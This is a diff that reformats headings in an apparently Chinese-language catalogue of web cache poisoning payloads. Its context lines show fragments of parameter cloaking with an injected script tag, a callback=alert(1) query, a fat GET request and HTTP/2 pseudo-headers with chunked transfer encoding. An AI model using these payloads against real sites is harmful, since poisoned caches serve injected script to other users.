@@ -2,7 +2,7 @@
 
 _3 条 web payload_
 
-### 缓存投毒  `cache-poisoning`
+## 缓存投毒  `cache-poisoning`
 _Web缓存投毒攻击_
 子类：**缓存投毒** · tags: `cache` `poisoning` `web-cache`
 
@@ -95,7 +95,7 @@ transfer-encoding: chunked
 ```
 **语法解析：**
 - `# 参数伪装(Parameter Cloaking):
-# UTM参数通常不在缓存键中:
+## UTM参数通常不在缓存键中:
 /page?utm_content=` — 注入代码 _value_
 - `<script>` — HTML标签/事件处理器 _tag_
 - `alert(1)` — 注入代码 _value_
@@ -103,7 +103,7 @@ transfer-encoding: chunked
 - `
 /page?callback=alert(1)&utm_source=x
 
-# Fat GET投毒:
+## Fat GET投毒:
 GET /api/data HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
@@ -114,7 +114,7 @@ q=` — 注入代码 _value_
 - `</script>` — HTML标签/事件处理器 _tag_
 - `
 
-# HTTP/2专属头:
+## HTTP/2专属头:
 :method: GET
 :path: /
 transfer-encoding: chunked` — 注入代码 _value_
